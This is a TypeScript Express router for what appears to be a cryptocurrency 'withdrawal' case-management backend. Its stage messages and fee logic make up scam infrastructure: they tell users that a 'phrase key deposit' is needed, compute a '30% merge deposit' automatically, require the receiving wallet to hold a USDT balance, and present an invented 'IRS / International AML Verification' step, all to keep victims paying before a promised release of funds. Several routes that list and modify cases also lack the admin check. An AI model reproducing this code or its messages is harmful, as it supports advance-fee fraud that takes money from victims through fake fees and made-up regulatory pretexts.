import { Router } from "express";
import { storage } from "../storage";
import { updateCaseSchema, updateCaseLetterSchema } from "@shared/schema";
import { z } from "zod";
import { checkAdminAuth } from "./middleware";

export const casesRouter = Router();

casesRouter.post("/", async (req, res) => {
  try {
    const { accessCode, status } = req.body;
    if (!accessCode) {
      res.status(400).json({ error: "Access code is required" });
      return;
    }
    
    const newCase = await storage.createCase({ 
      accessCode, 
      status: status || 'created' 
    });
    res.json(newCase);
  } catch (error: any) {
    if (error?.code === '23505') {
      res.status(400).json({ error: "Access code already exists" });
    } else {
      res.status(500).json({ error: error?.message || "Failed to create case" });
    }
  }
});

casesRouter.get("/", async (req, res) => {
  try {
    const allCases = await storage.getAllCases();
    res.json(allCases);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch cases" });
  }
});

casesRouter.get("/access/:code", async (req, res) => {
  try {
    const caseData = await storage.getCaseByAccessCode(req.params.code);
    if (!caseData) {
      res.status(404).json({ error: "Case not found" });
      return;
    }
    res.json(caseData);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch case" });
  }
});

casesRouter.get("/:id", async (req, res) => {
  try {
    const caseData = await storage.getCaseById(req.params.id);
    if (!caseData) {
      res.status(404).json({ error: "Case not found" });
      return;
    }
    res.json(caseData);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch case" });
  }
});

casesRouter.patch("/:id", async (req, res) => {
  try {
    const data = updateCaseSchema.parse(req.body);
    
    if (data.phraseKeyDepositAmount) {
      const numericMatch = data.phraseKeyDepositAmount.match(/[\d,.]+/);
      const currencyMatch = data.phraseKeyDepositAmount.match(/[A-Za-z]+$/);
      const currencySuffix = currencyMatch ? ' ' + currencyMatch[0] : '';
      
      if (numericMatch) {
        const depositAmount = parseFloat(numericMatch[0].replace(/,/g, ''));
        if (!isNaN(depositAmount)) {
          const mergeDeposit = depositAmount * 0.30;
          data.phraseKeyMergeDeposit = mergeDeposit.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + currencySuffix;
        }
      }
    }
    
    const currentCase = await storage.getCaseById(req.params.id);
    const previousStage = currentCase?.withdrawalStage;
    
    const updated = await storage.updateCase(req.params.id, data);
    if (!updated) {
      res.status(404).json({ error: "Case not found" });
      return;
    }
    
    const newStage = data.withdrawalStage;
    if (newStage && previousStage !== newStage) {
      const stageMessages: Record<string, { category: 'urgent' | 'processing' | 'resolved'; title: string; body: string }> = {
        '1': {
          category: 'processing',
          title: 'Phrase Key Deposit Received',
          body: 'Your phrase key deposit has been successfully received and confirmed on the blockchain ledger. Your account is now queued for phrase key generation. Please allow 24-48 hours for the secure encryption process to complete.'
        },
        '3': {
          category: 'resolved',
          title: 'Phrase Key Certificate Approved',
          body: 'Your Phrase Key has been successfully verified and approved. Your unique encryption certificate has been generated and is now active for withdrawal processing. This certificate is required for all future withdrawal transactions and ensures the security of your funds. Please proceed to the next verification stage.'
        },
        '4': {
          category: 'processing',
          title: 'Withdrawal Process Initiated',
          body: 'Your withdrawal request has been officially initiated. Our compliance team is now processing your request through our secure verification protocols. You will receive updates at each stage of the process.'
        },
        '7': {
          category: 'urgent',
          title: 'Phrase Key Merge Deposit Required',
          body: 'A 30% merge deposit is required to complete the phrase key verification process. This deposit is necessary to merge your phrase key with the network security protocol. Please deposit the required amount to proceed with your withdrawal.'
        },
        '8': {
          category: 'processing',
          title: 'Financial Department Verification',
          body: 'Your withdrawal request has advanced to the Financial Department for compliance verification. Our team is conducting thorough checks to ensure regulatory compliance and fund security.'
        },
        '10': {
          category: 'urgent',
          title: 'Blockchain Activity Verification Required',
          body: 'Blockchain activity verification is now required. Please ensure your receiving wallet maintains the required USDT balance for verification purposes. This step confirms wallet ownership and activity status.'
        },
        '11': {
          category: 'processing',
          title: 'IRS / International AML Verification',
          body: 'Your withdrawal is undergoing international anti-money laundering (AML) verification and IRS compliance checks. This is a standard regulatory requirement for large fund transfers.'
        },
        '13': {
          category: 'resolved',
          title: 'Withdrawal Successfully Released',
          body: 'Congratulations! Your withdrawal has been successfully processed and released to your designated wallet address. Funds should arrive within 24-72 hours depending on network congestion. Thank you for your patience throughout this process.'
        }
      };

      const stageMessage = stageMessages[newStage];
      if (stageMessage) {
        if (newStage === '3' && currentCase?.phraseKeyCertificateSent) {
        } else {
          try {
            await storage.createAdminMessage({
              caseId: req.params.id,
              category: stageMessage.category,
              title: stageMessage.title,
              body: stageMessage.body,
              isRead: false
            });
            
            if (newStage === '3') {
              await storage.updateCase(req.params.id, { phraseKeyCertificateSent: true });
            }
          } catch (msgError) {
            console.error('Failed to send stage message:', msgError);
          }
        }
      }
    }
    
    res.json(updated);
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ error: error.errors });
    } else {
      res.status(500).json({ error: "Failed to update case" });
    }
  }
});

casesRouter.delete("/:id", checkAdminAuth, async (req, res) => {
  const caseId = req.params.id;
  const forceDelete = req.query.force === 'true';
  
  try {
    const caseData = await storage.getCaseById(caseId);
    if (!caseData) {
      try {
        await storage.createAuditLog({
          action: 'delete_case_attempt',
          newValue: `Attempted to delete non-existent case: ${caseId}`,
          adminUsername: 'Admin',
          targetType: 'case',
          targetId: caseId
        });
      } catch {}
      res.status(404).json({ error: "Case not found" });
      return;
    }
    
    const verifiedStatuses = ['registered', 'syncing', 'active', 'completed'];
    const isVerified = verifiedStatuses.includes(caseData.status || '');
    
    if (isVerified && !forceDelete) {
      try {
        await storage.createAuditLog({
          action: 'delete_case_blocked',
          newValue: `Blocked deletion of verified account: ${caseData.userName || caseData.accessCode} (Status: ${caseData.status}) - Force confirmation required`,
          adminUsername: 'Admin',
          targetType: 'case',
          targetId: caseId
        });
      } catch {}
      res.status(403).json({ 
        error: "This is a verified account and cannot be deleted without explicit confirmation",
        requiresConfirmation: true,
        status: caseData.status
      });
      return;
    }
    
    await storage.deleteCase(caseId);
    
    try {
      await storage.createAuditLog({
        action: 'delete_case_success',
        previousValue: `Account: ${caseData.userName || caseData.accessCode} (Status: ${caseData.status})`,
        newValue: `Successfully deleted (Verified: ${isVerified}, Force: ${forceDelete})`,
        adminUsername: 'Admin',
        targetType: 'case',
        targetId: caseId
      });
    } catch (auditError) {
      console.error('Failed to create audit log:', auditError);
    }
    
    res.json({ success: true });
  } catch (error) {
    try {
      await storage.createAuditLog({
        action: 'delete_case_error',
        newValue: `Error deleting case ${caseId}: ${error instanceof Error ? error.message : 'Unknown error'}`,
        adminUsername: 'Admin',
        targetType: 'case',
        targetId: caseId
      });
    } catch {}
    res.status(500).json({ error: "Failed to delete case" });
  }
});

casesRouter.get("/:id/letter", async (req, res) => {
  try {
    const letter = await storage.getCaseLetterByCaseId(req.params.id);
    res.json(letter || null);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch letter" });
  }
});

casesRouter.put("/:id/letter", async (req, res) => {
  try {
    const data = updateCaseLetterSchema.parse(req.body);
    const letter = await storage.createOrUpdateCaseLetter(req.params.id, data);
    res.json(letter);
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ error: error.errors });
    } else {
      res.status(500).json({ error: "Failed to update letter" });
    }
  }
});

casesRouter.get("/:id/notes", async (req, res) => {
  try {
    const notes = await storage.getCaseNotesByCaseId(req.params.id);
    res.json(notes);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch notes" });
  }
});

casesRouter.post("/:id/notes", checkAdminAuth, async (req, res) => {
  try {
    const noteInput = z.object({
      content: z.string().min(1),
      isPinned: z.boolean().optional()
    }).parse(req.body);

    const note = await storage.createCaseNote({
      caseId: req.params.id,
      content: noteInput.content,
      isPinned: noteInput.isPinned || false,
      adminUsername: 'Admin'
    });
    res.json(note);
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ error: error.errors });
    } else {
      res.status(500).json({ error: "Failed to create note" });
    }
  }
});

casesRouter.patch("/:caseId/notes/:noteId", checkAdminAuth, async (req, res) => {
  try {
    const noteInput = z.object({
      content: z.string().min(1).optional(),
      isPinned: z.boolean().optional()
    }).parse(req.body);

    const note = await storage.updateCaseNote(parseInt(req.params.noteId), noteInput);
    if (!note) {
      res.status(404).json({ error: "Note not found" });
      return;
    }
    res.json(note);
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ error: error.errors });
    } else {
      res.status(500).json({ error: "Failed to update note" });
    }
  }
});

casesRouter.delete("/:caseId/notes/:noteId", checkAdminAuth, async (req, res) => {
  try {
    await storage.deleteCaseNote(parseInt(req.params.noteId));
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Failed to delete note" });
  }
});
